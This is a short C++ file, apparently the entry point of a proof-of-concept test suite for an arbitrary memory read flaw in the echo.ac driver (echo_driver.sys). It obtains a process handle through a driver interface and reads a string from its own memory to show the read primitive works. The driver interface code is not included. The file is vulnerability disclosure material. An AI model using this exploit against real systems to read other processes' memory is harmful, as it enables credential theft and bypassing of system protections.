#include "DriverInterface.h"

int main() {
    std::cout << "echo_driver.sys PoC test suite." << std::endl;
    DriverInterface Driver;

    std::cout << "This first test demonstrates reading a string defined in this program, and then printing it." << std::endl;
    HANDLE processHandle = Driver.get_handle_for_pid(GetCurrentProcessId());

    const char* self_test_string = "This is a PoC of an arbitrary read vulnerability in the echo.ac driver.";

    const char* output = Driver.read_memory<const char*>(
            (void*)self_test_string, // Address to read from
            strlen(self_test_string), // Size to read
            processHandle // Handle
            );

    std::cout << output << std::endl;

    return 0;
}
